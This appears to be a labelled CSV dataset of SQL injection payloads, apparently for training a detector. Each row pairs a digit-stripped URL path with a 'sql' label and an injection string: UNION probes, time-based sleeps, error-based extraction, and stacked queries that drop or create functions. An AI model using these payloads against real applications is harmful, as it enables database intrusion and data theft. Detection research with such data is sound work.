,language,source
2273,sql,". . . ? = & = & =   % "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " % " = " "
2274,sql,". . . / / ? = & = & = & =   ) AND = AND ( = "
2275,sql,". . . . / / ? = & = & = & =  - ) ORDER BY # "
2276,sql,". . / / / ? = & =  - ' ) UNION ALL SELECT # "
2277,sql,". . . ? = & =   "" ) ) RLIKE SLEEP ( ) AND ( ( " TcaV " = " "
2278,sql,". . ? = & =    AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
2279,sql,". . . / / / / ? = & = & = & =   % ' ) ; SELECT SLEEP ( ) AND ( ' % ' = ' "
2280,sql,". . / / ? = & = & = & =  - ) ORDER BY # "
2281,sql,". . . / / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2282,sql,". . . . / / / ? = & =   ) AND = AND ( = "
2283,sql,". . . . ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2284,sql,". . . . / / / ? = & = & =  - "" ) UNION ALL SELECT , , # "
2285,sql,". . . / / / ? = & = & =   ) ; IF ( = ) SELECT  ELSE DROP FUNCTION Gguo --"
2286,sql,". . . . / / / / ? = & =   ) ) ; SELECT PG_SLEEP ( )  --"
2287,sql,". . / / / / ? =  - UNION ALL SELECT # "
2288,sql,". . ? = & = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) )  -- "
2289,sql,". . . / / / ? = & =   ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' QhGk ' LIKE ' "
2290,sql,". . . . / / / / ? = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2291,sql,". . / / ? =  - ' UNION ALL SELECT , , , # "
2292,sql,". . . / / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , , # "
2293,sql,". . . . ? = & = & = & =   AND MAKE_SET ( = , ) "
2294,sql,". . . / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2295,sql,". . ? =   ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2296,sql,". . / ? = & = & = & =   % ' AND ELT ( = , SLEEP ( ) ) AND ' % ' = ' "
2297,sql,". . / / / / ? = & = & =  - "" ) UNION ALL SELECT , , ,  -- "
2298,sql,". . / / ? = & = & =   ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2299,sql,". . / / ? = & =   % ' ORDER BY  -- "
2300,sql,". . . . / / / / ? = & = & =    WAITFOR DELAY ' : : ' # "
2301,sql,". . . . / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2302,sql,". . . / ? = & =   ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2303,sql,". . . ? = & = & = & =  - ' ) UNION ALL SELECT , , , , # "
2304,sql,". . / / / ? = & = & =   ' ) AND = # "
2305,sql,". . . / / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2306,sql,". . . . / ? =   % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION TQqK --"
2307,sql,". . . / / / ? = & = & = & =   "" ) AND = % "
2308,sql,". . ? = & =  - ' ) UNION ALL SELECT , , , , , , # "
2309,sql,". . . / / ? = & = & = & =   % ' AND MAKE_SET ( = , ) AND ' % ' = ' "
2310,sql,". . / / ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2311,sql,". . / / ? = & = & = & =   "" ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2312,sql,". . / / ? = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2313,sql,". . / / ? = & = & =  - ' ) ) UNION ALL SELECT , , , , , , ,  -- "
2314,sql,". . / / / ? = & = & =  - ' ORDER BY  -- "
2315,sql,". . . ? = & =   "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " OgbI " LIKE " "
2316,sql,". . . . / / ? =   "" ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2317,sql,". . / / / ? = & = & = & =   ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' dbjN ' = ' "
2318,sql,". . . . ? = & =   % ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' % ' = ' "
2319,sql,". . . . / / ? =   AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
2320,sql,". . . . / / / ? = & =   "" ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2321,sql,". . . ? = & =   AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) # "
2322,sql,". . . ? = & = & =   % ' AND MAKE_SET ( = , ) AND ' % ' = ' "
2323,sql,". . ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2324,sql,". . . . / ? =   "" ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( " YKqr " = " "
2325,sql,". . / / / ? = & = & =   "" AND =  -- "
2326,sql,". . / / ? =  - ' ) ) UNION ALL SELECT , , , ,  -- "
2327,sql,". . . / / / ? = & = & =  - ' ) UNION ALL SELECT , , , ,  -- "
2328,sql,". . . . / / / ? = & = & =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' zpwY ' LIKE ' "
2329,sql,". . . . ? = & =  - "" UNION ALL SELECT , , , , , # "
2330,sql,". . / / / ? = & = & = & =   ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( = "
2331,sql,". . . . / / ? = & = & = & =  - "" UNION ALL SELECT , , , , ,  -- "
2332,sql,". . ? = & = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2333,sql,". . . / / / / ? = & = & =   ' ) ) ) UNION ALL SELECT NULL # "
2334,sql,". . ? = & = & =   ' ) ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ( ' zPIP ' = ' "
2335,sql,". . . / / / ? = & =  ] ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( = "
2336,sql,". . / / / ? =   ' ) ) ORDER BY  -- "
2337,sql,". . . . / / / ? = & =   ' ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ' ydFc ' = ' "
2338,sql,". . / / ? =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " EIzt " LIKE " "
2339,sql,". . . / / ? = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2340,sql,". . . . / ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2341,sql,". . . / / / / ? = & =  - ' UNION ALL SELECT , , # "
2342,sql,". . ? = & = & =   % "" AND MAKE_SET ( = , ) AND " % " = " "
2343,sql,". . / ? =   % ' ) ) ; WAITFOR DELAY ' : : '  --"
2344,sql,". . . . ? = & = & =   ) WAITFOR DELAY ' : : ' AND ( = "
2345,sql,". . . . / / / ? = & = & =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
2346,sql,". . . . / / / / ? =   % ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' % ' = ' "
2347,sql,". . . . / / ? = & = & =   ' AND ELT ( = , SLEEP ( ) )  -- "
2348,sql,". . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2349,sql,". . ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2350,sql,". . . . / ? =  - ' ) ) UNION ALL SELECT , , , , , , , # "
2351,sql,". . . / / ? = & =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ' zFxM ' = ' "
2352,sql,". . . ? =   % ' ) AND SLEEP ( ) AND ( ' % ' = ' "
2353,sql,". . . / ? =  - ' ) ) ) UNION ALL SELECT , , , , , , # "
2354,sql,". . / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2355,sql,". . . . / / / / ? = & =   "" AND = % "
2356,sql,". . . / / ? = & = & = & =   "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " hdwo " LIKE " "
2357,sql,". . . / / / ? = & = & = & =   ' ) AND = # "
2358,sql,". . . . / / / ? = & =   ' ) ) ) AND = AND ( ( ( ' YgPk ' = ' "
2359,sql,". . / / / ? = & = & =   ' ) AND MAKE_SET ( = , ) AND ( ' FduN ' = ' "
2360,sql,". . / ? = & = & =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
2361,sql,". . . . / / / / ? = & = & =   % ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' % ' = ' "
2362,sql,". . / ? = & = & = & =   ) AND =  -- "
2363,sql,". . . / ? = & = & = & =   % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2364,sql,". . . / / ? = & = & =   ' ) ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ( ' WaLy ' = ' "
2365,sql,". . / / / / ? = & =   AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) "
2366,sql,". . / / ? = & =   UNION ALL SELECT NULL , NULL , NULL -- "
2367,sql,". . / / / ? = & =   ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' Wryi ' LIKE ' "
2368,sql,". . ? =   AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) # "
2369,sql,". . . . / / / ? = & = & =  - % ' ) ) UNION ALL SELECT  -- "
2370,sql,". . . . / / / / ? = & = & = & =   % ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' % ' = ' "
2371,sql,". . / / ? = & = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL # "
2372,sql,". . . . ? = & =   ' RLIKE SLEEP ( )  -- "
2373,sql,". . / ? = & = & = & =   ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ' bedW ' LIKE ' "
2374,sql,". . . . / / / / ? =  - ORDER BY  -- "
2375,sql,". . . / ? = & =  - % ' ) UNION ALL SELECT , , , , # "
2376,sql,". . / / / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL -- "
2377,sql,". . / / ? =   % ' ) AND = # "
2378,sql,". . . / / / / ? = & =   "" UNION ALL SELECT NULL # "
2379,sql,". . . / / / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2380,sql,". . . . / ? = & =   ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' MzaZ ' = ' "
2381,sql,". . . . / / / ? = & =   ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( = "
2382,sql,". . . . / / / ? = & =   % "" RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND " % " = " "
2383,sql,". . . / ? =  - % ' ) ) UNION ALL SELECT , , , , , , , , # "
2384,sql,". . . ? =   ' ) ) ; SELECT SLEEP ( ) AND ( ( ' IBiJ ' LIKE ' "
2385,sql,". . . . / ? = & =    UNION ALL SELECT NULL -- "
2386,sql,". . . . / ? =   ' ) ) ) ; SELECT PG_SLEEP ( )  --"
2387,sql,". . . . / ? = & = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2388,sql,". . . / / / / ? = & =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' % ' = ' "
2389,sql,". . . / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2390,sql,". . . / ? =   % ' ) AND =  -- "
2391,sql,". . ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2392,sql,". . / / ? = & =   ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) "
2393,sql,". . / / ? =  - ) ) ) UNION ALL SELECT # "
2394,sql,". . . / / / / ? = & = & = & =   ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' WGym ' = ' "
2395,sql,". . . / ? = & = & =    RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) )  -- "
2396,sql,". . . / / ? = & = & = & =   ' UNION ALL SELECT NULL # "
2397,sql,". . . / / / ? =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' % ' = ' "
2398,sql,". . . . / / / / ? = & = & = & =  - UNION ALL SELECT # "
2399,sql,". . / / / ? = & =  - ) UNION ALL SELECT , , , # "
2400,sql,". . . . / / / / ? = & = & = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
2401,sql,". . . . ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2402,sql,". . ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2403,sql,". . . / / ? = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2404,sql,". . / / ? = & = & =   ) ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ( = "
2405,sql,". . / / ? = & = & =   % ' AND = AND ' % ' = ' "
2406,sql,". . . / / ? = & =  - "" ) UNION ALL SELECT , , , , , , # "
2407,sql,". . . . / / / / ? = & =   ) ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ( = "
2408,sql,". . ? = & = & =  - "" UNION ALL SELECT , , , , # "
2409,sql,". . / / / ? = & = & = & =  - ' ) ) UNION ALL SELECT , , , , , , , ,  -- "
2410,sql,". . / / / ? = & = & =   "" ) AND MAKE_SET ( = , ) AND ( " onIU " LIKE " "
2411,sql,". . . . / / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , # "
2412,sql,". . / / ? = & =   % "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " % " = " "
2413,sql,". . / ? = & = & =   , ( BEGIN IF ( = ) THEN DBMS_LOCK . SLEEP ( ) ; ELSE DBMS_LOCK . SLEEP ( ) ; END IF ; END ; ) "
2414,sql,". . . . / ? = & = & = & =   % ' ) AND = % "
2415,sql,". . . ? = & = & = & =  - ' ) UNION ALL SELECT , , , , , , , , ,  -- "
2416,sql,". . . / ? = & = & = & =   % "" UNION ALL SELECT NULL , NULL -- "
2417,sql,". . . / ? = & = & = & =   ' ) ) ) ; SELECT SLEEP ( ) # "
2418,sql,". . / / ? =   ' ) ; SELECT SLEEP ( ) AND ( ' fxQl ' LIKE ' "
2419,sql,". . / / ? =   % "" ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2420,sql,". . . . / / ? = & =   ' ) ORDER BY # "
2421,sql,". . / ? = & =   "" ) ) AND =  -- "
2422,sql,". . . . ? =  - "" ) UNION ALL SELECT , , , , , , , , ,  -- "
2423,sql,". . ? = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2424,sql,". . / ? =  - ' UNION ALL SELECT ,  -- "
2425,sql,". . / / / / ? = & = & =   % ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' % ' = ' "
2426,sql,". . . / / / / ? =   ' ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ' AnDX ' LIKE ' "
2427,sql,". . . . / / ? = & = & = & =   "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " UOhd " = " "
2428,sql,". . . ? = & = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2429,sql,". . . . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2430,sql,". . . / ? = & =   ) ) AND = AND ( ( = "
2431,sql,". . . . / / ? = & = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2432,sql,". . . . / ? = & =  - UNION ALL SELECT # "
2433,sql,". . . / ? = & = & =   ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' bOzV ' LIKE ' "
2434,sql,". . . / ? = & = & =   AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
2435,sql,". . . . / ? = & = & =   "" UNION ALL SELECT NULL , NULL # "
2436,sql,". . / / / / ? =  - ' ) UNION ALL SELECT , , ,  -- "
2437,sql,". . . . / ? = & =  - "" ) ORDER BY  -- "
2438,sql,". . . ? = & = & =   ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
2439,sql,". . ? = & = & = & =   "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " UOhd " = " "
2440,sql,". . / / / ? = & =   ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
2441,sql,". . . / / / ? =   ' ) ) RLIKE SLEEP ( ) AND ( ( ' iZcy ' = ' "
2442,sql,". . . ? = & =   "" ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( " yYgZ " = " "
2443,sql,". . . . ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2444,sql,". . . / / / ? = & = & = & =   ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' DYZE ' LIKE ' "
2445,sql,". . . . / / / / ? = & = & = & =   % ' ) ) RLIKE SLEEP ( ) AND ( ( ' % ' = ' "
2446,sql,". . . / / / / ? = & = & =   ' ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ' PGqC ' = ' "
2447,sql,". . / / ? = & = & =  - "" ) ) UNION ALL SELECT , , , , , # "
2448,sql,". . / / ? = & = & = & =  - ' ) ORDER BY # "
2449,sql,". . / / ? = & = & =   % ' ) ) ORDER BY # "
2450,sql,". . . . ? = & = & = & =   % "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " % " = " "
2451,sql,". . . / ? = & =   AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) # "
2452,sql,". . / / / / ? = & = & = & =   ( SELECT ( CASE WHEN ( = ) THEN DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) ELSE  END ) FROM DUAL ) "
2453,sql,". . . . / / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2454,sql,". . . / ? = & =  - UNION ALL SELECT # "
2455,sql,". . . / / / / ? = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2456,sql,". . . . / / / / ? = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2457,sql,". . / / ? = & =   ' AND = # "
2458,sql,". . / / / ? =   , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s ) "
2459,sql,". . . / / / / ? =   ' WAITFOR DELAY ' : : '  -- "
2460,sql,". . . . / / / / ? = & =   ) AND = % "
2461,sql,". . . / / / / ? = & =  - "" ) UNION ALL SELECT , , , # "
2462,sql,". . . ? = & =  - ' ) UNION ALL SELECT , , , , , , , , ,  -- "
2463,sql,". . / / / / ? = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2464,sql,". . . . / / / ? = & = & =   % ' AND = # "
2465,sql,". . . . / / ? = & = & =   ' AND = % "
2466,sql,". . / ? =   % ' ) ) ; SELECT PG_SLEEP ( )  --"
2467,sql,". . . . / / / / ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
